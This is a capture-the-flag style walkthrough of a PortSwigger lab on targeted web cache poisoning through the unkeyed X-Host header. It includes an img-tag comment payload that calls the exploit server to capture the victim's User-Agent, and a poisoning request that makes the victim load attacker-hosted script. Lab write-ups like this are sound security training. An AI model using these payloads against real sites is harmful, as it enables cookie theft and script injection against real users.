
# Targeted web cache poisoning using an unknown header

This lab is vulnerable to web cache poisoning. A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executes alert(document.cookie) in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.

---------------------------------------------

References: 

- https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws



![img](images/Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/1.png)

---------------------------------------------

We get the “Vary” header in the response to “/post/comment?postId=2”: 



![img](images/Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/2.png)



There are 4 imported scripts, the only one containing the full url is tracking.js:





![img](images/Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/3.png)
![img](images/Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/4.png)



We will launch Param Miner as X-Forwarded-Host and X-Forwarded-Scheme headers do not seem to work:



![img](images/Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/5.png)



It detects two secret headers, Origin and X-Host:





![img](images/Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/6.png)
![img](images/Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/7.png)



If we send these headers with the exploit server hostname, we see the hostname gets reflected (the one working is X-Host):



![img](images/Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/8.png)



We will create the Javascript payload in the exploit server:



![img](images/Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/9.png)



Then send the request to Intruder and use the list of User-Agents:





![img](images/Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/10.png)
![img](images/Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/11.png)


However this approach provokes the server to go down:



![img](images/Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/12.png)


We will create a comment with this payload:

```
<img src="https://exploit-0acc00f704141c10817b1b2e011000d5.exploit-server.net/foo" />
```

We get the User-Agent “Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36”:



![img](images/Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/13.png)

And finally:

```
GET / HTTP/1.1
...
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
X-Host: exploit-0acc00f704141c10817b1b2e011000d5.exploit-server.net
...
```



![img](images/Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header/14.png)